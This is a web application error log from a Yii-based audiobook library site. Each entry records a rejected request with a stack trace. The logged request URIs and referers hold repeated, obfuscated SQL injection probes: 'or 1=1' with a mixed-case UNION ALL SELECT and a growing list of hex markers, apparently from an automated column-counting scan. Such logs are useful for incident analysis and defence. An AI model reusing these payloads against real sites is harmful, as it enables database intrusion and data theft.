+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39
+---
+2023/08/01 12:18:30 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39
+---
+2023/08/01 12:18:33 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39%2c0x39363135373834333032382e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39%2c0x39363135373834333032382e39
+---
+2023/08/01 12:18:47 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39%2c0x39363135373834333032382e39%2c0x39363135373834333032392e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39%2c0x39363135373834333032382e39%2c0x39363135373834333032392e39
+---
+2023/08/01 12:18:51 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39%2c0x39363135373834333032382e39%2c0x39363135373834333032392e39%2c0x39363135373834333033302e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39%2c0x39363135373834333032382e39%2c0x39363135373834333032392e39%2c0x39363135373834333033302e39
+---
+2023/08/01 12:18:54 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39%2c0x39363135373834333032382e39%2c0x39363135373834333032392e39%2c0x39363135373834333033302e39%2c0x39363135373834333033312e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39%2c0x39363135373834333032382e39%2c0x39363135373834333032392e39%2c0x39363135373834333033302e39%2c0x39363135373834333033312e39
+---
+2023/08/01 12:19:14 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39%2c0x39363135373834333032382e39%2c0x39363135373834333032392e39%2c0x39363135373834333033302e39%2c0x39363135373834333033312e39%2c0x39363135373834333033322e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39%2c0x39363135373834333032382e39%2c0x39363135373834333032392e39%2c0x39363135373834333033302e39%2c0x39363135373834333033312e39%2c0x39363135373834333033322e39
+---
+2023/08/01 12:19:18 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39%2c0x39363135373834333032382e39%2c0x39363135373834333032392e39%2c0x39363135373834333033302e39%2c0x39363135373834333033312e39%2c0x39363135373834333033322e39%2c0x39363135373834333033332e39
